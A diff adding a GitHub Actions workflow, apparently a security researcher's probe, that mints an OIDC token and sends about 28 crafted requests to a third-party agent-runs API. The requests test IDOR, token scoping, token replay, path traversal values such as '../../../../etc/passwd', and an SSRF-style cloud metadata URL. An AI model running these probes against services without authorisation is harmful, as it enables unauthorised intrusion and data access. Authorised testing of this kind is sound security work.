@@ -1,0 +1,125 @@
+name: actions-matrix
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  full-matrix:
+    runs-on: [self-hosted, probe]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Full actions.macroscope.com matrix
+        shell: bash
+        run: |
+          set +e
+          OUT=/home/dave/security-research/macroscope/data/oidc-probe/matrix2
+          mkdir -p "$OUT"
+          rm -f "$OUT"/*.txt
+          token=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=macroscope" | jq -r .value)
+          echo "$token" > "$OUT/00-token.txt"
+          echo "TOKEN_LEN=${#token}"
+          sha=$(git rev-parse HEAD)
+          echo "SHA=$sha"
+          base="https://actions.macroscope.com/api/v1/github-actions/agent-runs"
+          do_post() { # $1=name $2=jsonbody $3..=extra curl args
+            local name=$1 body=$2; shift 2
+            curl -sS -X POST "$base" -H "Authorization: Bearer $token" -H "X-Macroscope-Action-Version: v1" -H "Content-Type: application/json" "$@" -d "$body" -w "\n__HTTP:%{http_code}" > "$OUT/$name.txt" 2>&1
+            echo "== $name -> $(tail -1 "$OUT/$name.txt")"
+          }
+          do_get() { # $1=name $2=url $3=bearer $4..=extra args
+            local name=$1 url=$2 bearer=$3; shift 3
+            curl -sS "$url" -H "Authorization: Bearer $bearer" -H "X-Macroscope-Action-Version: v1" "$@" -w "\n__HTTP:%{http_code}" > "$OUT/$name.txt" 2>&1
+            echo "== $name -> $(tail -1 "$OUT/$name.txt")"
+          }
+
+          # 1. baseline create (agent probe, full_diff, own repo)
+          do_post p01-create-own "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}"
+          runid1=$(jq -r '.runId // empty' "$OUT/p01-create-own.txt" 2>/dev/null)
+          jobtok1=$(jq -r '.jobToken // empty' "$OUT/p01-create-own.txt" 2>/dev/null)
+          echo "RUN1=$runid1 JOBTOK1_LEN=${#jobtok1}"
+
+          # 2. GET own run w/ own jobToken
+          if [ -n "$runid1" ]; then
+            do_get p02-get-own "$base/$runid1" "$jobtok1"
+            # 2b. poll again after 3s (status transition)
+            sleep 3
+            do_get p02b-get-own-2 "$base/$runid1" "$jobtok1"
+            sleep 5
+            do_get p02c-get-own-3 "$base/$runid1" "$jobtok1"
+            # 3. GET foreign random UUID w/ own jobToken (IDOR)
+            do_get p03-get-random-uuid "$base/11111111-2222-4333-8444-555566667777" "$jobtok1"
+            # 4. GET own run, NO token
+            curl -sS "$base/$runid1" -w "\n__HTTP:%{http_code}" > "$OUT/p04-get-notoken.txt" 2>&1
+            echo "== p04 -> $(tail -1 "$OUT/p04-get-notoken.txt")"
+            # 5. GET own run w/ OIDC token instead of jobToken
+            do_get p05-get-oidc-tok "$base/$runid1" "$token"
+            # 6. GET own run w/ garbage token
+            do_get p06-get-garbage-tok "$base/$runid1" "garbage.token.here"
+            # 7. GET with ULID-format run id (hooks format)
+            do_get p07-get-ulid "$base/01a098a4-0cc7-788a-afd5-77a82a889028" "$jobtok1"
+            # 8. GET own run, no version header
+            curl -sS "$base/$runid1" -H "Authorization: Bearer $jobtok1" -w "\n__HTTP:%{http_code}" > "$OUT/p08-get-nover.txt" 2>&1
+            echo "== p08 -> $(tail -1 "$OUT/p08-get-nover.txt")"
+            # 9. GET own run, traversal version header
+            do_get p09-get-badver "$base/$runid1" "$jobtok1" -H "X-Macroscope-Action-Version: ../../etc/passwd"
+          fi
+
+          # 10. create run 2
+          do_post p10-create-2 "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}"
+          runid2=$(jq -r '.runId // empty' "$OUT/p10-create-2.txt" 2>/dev/null)
+          jobtok2=$(jq -r '.jobToken // empty' "$OUT/p10-create-2.txt" 2>/dev/null)
+          echo "RUN2=$runid2 JOBTOK2_LEN=${#jobtok2}"
+
+          # 11. cross-run tokens: tok1 -> run2, tok2 -> run1 (jobToken scoping)
+          if [ -n "$runid1" ] && [ -n "$runid2" ]; then
+            do_get p11a-cross-tok1-run2 "$base/$runid2" "$jobtok1"
+            do_get p11b-cross-tok2-run1 "$base/$runid1" "$jobtok2"
+          fi
+
+          # 12. create w/ agent path traversal ../../probe (root agent location exists)
+          do_post p12-agent-traversal "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"../../probe\",\"commit\":\"$sha\"}"
+          # 13. create w/ agent traversal deep
+          do_post p13-agent-traversal-deep "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"../../../../etc/passwd\",\"commit\":\"$sha\"}"
+          # 14. create w/ nonexistent agent
+          do_post p14-agent-nonexistent "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"does-not-exist-xyz\",\"commit\":\"$sha\"}"
+          # 15. create w/ bogus commit (all-zero)
+          do_post p15-bogus-commit "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"0000000000000000000000000000000000000000\"}"
+          # 16. create w/ commit = ref
+          do_post p16-commit-ref "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"refs/heads/main\"}"
+          # 17. create w/ foreign PUBLIC repo (octocat/Hello-World) + my sha
+          do_post p17-foreign-repo "{\"repository\":\"octocat/Hello-World\",\"agent\":\"probe\",\"commit\":\"$sha\"}"
+          # 18. create w/ foreign repo + real Hello-World sha (look up via api)
+          hwsha=$(curl -sS https://api.github.com/repos/octocat/Hello-World/commits/main 2>/dev/null | jq -r '.sha // empty')
+          echo "HW_SHA=$hwsha"
+          [ -n "$hwsha" ] && do_post p18-foreign-repo-real "{\"repository\":\"octocat/Hello-World\",\"agent\":\"probe\",\"commit\":\"$hwsha\"}"
+          # 19. create w/ repository as full URL (SSRF-ish parse test)
+          do_post p19-repo-url "{\"repository\":\"http://169.254.169.254/latest/meta-data/\",\"agent\":\"probe\",\"commit\":\"$sha\"}"
+          # 20. create w/ repo github.com/owner/name form
+          do_post p20-repo-githuburl "{\"repository\":\"github.com/ugbodagadave/macroscope-oidc-test\",\"agent\":\"probe\",\"commit\":\"$sha\"}"
+          # 21. create w/ additionalInstructions marker
+          do_post p21-additional-instructions "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"additionalInstructions\":\"RESEARCHER-MARKER-$(date +%s)\"}"
+          # 22. idempotencyDiscriminator same twice
+          do_post p22a-idem-same "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"idempotencyDiscriminator\":\"disc-same-1\"}"
+          do_post p22b-idem-same-2 "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"idempotencyDiscriminator\":\"disc-same-1\"}"
+          do_post p22c-idem-diff "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"idempotencyDiscriminator\":\"disc-diff-2\"}"
+          # 23. POST no version header
+          curl -sS -X POST "$base" -H "Authorization: Bearer $token" -H "Content-Type: application/json" -d "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}" -w "\n__HTTP:%{http_code}" > "$OUT/p23-post-nover.txt" 2>&1
+          echo "== p23 -> $(tail -1 "$OUT/p23-post-nover.txt")"
+          # 24. POST bad version header (traversal)
+          curl -sS -X POST "$base" -H "Authorization: Bearer $token" -H "Content-Type: application/json" -H "X-Macroscope-Action-Version: ../../etc/passwd" -d "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}" -w "\n__HTTP:%{http_code}" > "$OUT/p24-post-badver.txt" 2>&1
+          echo "== p24 -> $(tail -1 "$OUT/p24-post-badver.txt")"
+          # 25. POST w/ agent absolute-ish path
+          do_post p25-agent-abs "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"/probe\",\"commit\":\"$sha\"}"
+          # 26. replay same OIDC token on new POST (already done via p10; also reuse runid1 token to poll run2? done p11). Mint 2nd token and reuse old:
+          token2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=macroscope" | jq -r .value)
+          curl -sS -X POST "$base" -H "Authorization: Bearer $token" -H "X-Macroscope-Action-Version: v1" -H "Content-Type: application/json" -d "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}" -w "\n__HTTP:%{http_code}" > "$OUT/p26-old-token-reuse.txt" 2>&1
+          echo "== p26 -> $(tail -1 "$OUT/p26-old-token-reuse.txt")"
+          # 27. empty agent
+          do_post p27-agent-empty "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"\",\"commit\":\"$sha\"}"
+          # 28. missing agent field
+          do_post p28-agent-missing "{\"repository\":\"$GITHUB_REPOSITORY\",\"commit\":\"$sha\"}"
+          echo "=== DONE ==="
+          ls -la "$OUT"
